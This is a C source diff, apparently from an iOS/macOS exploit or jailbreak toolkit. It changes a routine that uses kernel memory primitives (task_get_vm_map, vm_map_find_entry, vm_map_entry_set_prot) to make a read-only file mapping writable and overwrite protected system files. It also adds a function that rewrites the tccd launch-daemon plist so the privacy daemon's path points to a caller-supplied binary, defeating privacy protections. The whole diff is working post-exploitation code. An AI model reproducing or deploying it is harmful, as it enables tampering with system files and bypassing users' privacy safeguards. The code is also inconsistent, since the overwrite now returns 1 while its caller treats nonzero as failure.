@@ -181,7 +181,7 @@ uint64_t funVnodeOverwrite2(char* to, char* from) {
     }
     
     printf("it is writable!!\n");
-    memcpy(to_file_data, from_file_data, 1);
+    memcpy(to_file_data, from_file_data, from_file_size);
 
     // Cleanup
     munmap(from_file_data, from_file_size);
@@ -195,8 +195,7 @@ uint64_t funVnodeOverwrite2(char* to, char* from) {
 }
 
 uint64_t funVnodeOverwriteWithBytes(const char* filename, off_t file_offset, const void* overwrite_data, size_t overwrite_length, bool unmapAtEnd) {
-    printf("overwrite with bytes\n");
-    
+    printf("attempting opa's method\n");
     int file_index = open(filename, O_RDONLY);
     if (file_index == -1) return -1;
     off_t file_size = lseek(file_index, 0, SEEK_END);
@@ -207,34 +206,85 @@ uint64_t funVnodeOverwriteWithBytes(const char* filename, off_t file_offset, con
         return -1;
     }
     
-    // mmap as read-write
+//     mmap as read-write
     printf("mmap as read only\n");
-    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_SHARED, file_index, 0);
+    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, file_index, 0);
     if (file_data == MAP_FAILED) {
+        printf("failed mmap...\n try again");
         close(file_index);
         // Handle error mapping the file
-        printf("failed mmap...\n try again");
         return -1;
     }
     
     printf("task_get_vm_map -> vm ptr\n");
-    uint64_t vm_ptr = task_get_vm_map(getTask());
+    uint64_t task_ptr = getTask();
+    uint64_t vm_ptr = task_get_vm_map(task_ptr);
+    printf("entry_ptr\n");
     uint64_t entry_ptr = vm_map_find_entry(vm_ptr, (uint64_t)file_data);
-    
     printf("set prot to rw-\n");
     vm_map_entry_set_prot(entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
     
-    // Write the provided data at the specified offset
     printf("Writing data at offset %lld\n", file_offset);
     memcpy(file_data + file_offset, overwrite_data, overwrite_length);
     
-    // Optionally unmap the memory at the end
-    if (unmapAtEnd) {
-        // Cleanup
+//    if (unmapAtEnd) {
         munmap(file_data, file_size);
         close(file_index);
-    }
+//    }
 
-    // Return success or error code
+    return 1;
+}
+
+uint64_t funVnodeOverwriteTccdPlist(char* path) {
+    const char* plistFilePath = "/System/Library/LaunchDaemons/com.apple.tccd.plist";
+    const char* oldString = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
+    const char* newString = path;
+    // Open the plist file for reading
+    printf("opening plist file\n");
+    FILE* file = fopen(plistFilePath, "r");
+    if (!file) {
+        fprintf(stderr, "Failed to open the property list file.\n");
+        return 1;
+    }
+    // Find the file size
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    fseek(file, 0, SEEK_SET);
+    // Allocate memory to store the content
+    char* content = (char*)malloc(fileSize + 1); // Add 1 for null terminator
+    if (!content) {
+        fprintf(stderr, "Memory allocation failed.\n");
+        fclose(file);
+        return 1;
+    }
+    // Read the content of the plist file
+    size_t bytesRead = fread(content, 1, fileSize, file);
+    fclose(file);
+    if (bytesRead != (size_t)fileSize) {
+        fprintf(stderr, "Error while reading the property list file.\n");
+        free(content);
+        return 1;
+    }
+    content[fileSize] = '\0'; // Null-terminate the content
+    // Find the position of the old string in the content
+    char* position = strstr(content, oldString);
+    if (!position) {
+        fprintf(stderr, "The old string was not found in the property list.\n");
+        free(content);
+        return 1;
+    }
+    // Calculate the offset of the old string within the file
+    off_t oldStringOffset = position - content;
+    // Write the new string into the plist file using the provided function
+    printf("overwriting tccd plist with bytes\n");
+    uint64_t result = funVnodeOverwriteWithBytes(plistFilePath, oldStringOffset, newString, strlen(newString), true);
+    if (result != 0) {
+        fprintf(stderr, "Failed to overwrite the old string with the new string.\n");
+        free(content);
+        return 1;
+    }
+    // Free dynamically allocated memory
+    free(content);
+    printf("Property list file successfully modified.\n");
     return 0;
 }
